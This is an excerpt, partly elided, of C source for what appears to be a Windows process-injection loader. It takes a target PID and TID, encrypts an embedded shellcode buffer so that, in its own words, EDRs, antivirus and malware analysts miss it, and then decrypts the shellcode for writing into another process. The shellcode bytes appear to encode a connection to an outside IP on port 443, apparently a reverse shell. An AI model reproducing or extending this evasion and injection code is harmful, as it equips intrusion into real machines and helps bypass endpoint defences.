...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xac\x14\x90\x01\x41\x54"
...
int main(int argc, char* argv[])
{
	...
	if (argc < 3) {
		...
		printf("Usage error , program.exe <PID> <TID>");
		return EXIT_FAILURE;
	}
	...
	/* JSK ----->>>>>> Generate Rnadom key and IV  <<<______________ JSK */
	...
	/*    Verifiiiiii KEY + IV  rouj   */

	PrintHexData("KEY", key, sizeof(key));
	PrintHexData("IV", Iv, sizeof(Iv));





	/* ------------- ()()()() Encrypt the Shellcode to obsucate from EDRs nd Avs and Mlaware analyst  ()()()()------------------*/
	DWORD shellsize = sizeof(Shell);
	successEnc = SimpleEncryption(Shell, shellsize, key, Iv, &PcipherT, &Ciphersize);
	...
	/* ------------- ()()()() Decrypt the shelcode because we need to write it to the memory of the process ()()()()------------------*/

	char s = getchar();
	DWORD ciphersize = Ciphersize;

	// Allocate memory for restoreShell before decryption
	restoreShell = malloc(shellsize);

	successDec = SimpleDecryption(PcipherT, ciphersize , key, Iv, &restoreShell, &shellsize);
	...
	/* ------------- ()()()() We are done we can encrypt it again  ()()()()------------------*/
	
	HeapFree(GetProcessHeap, 0, restoreShell);
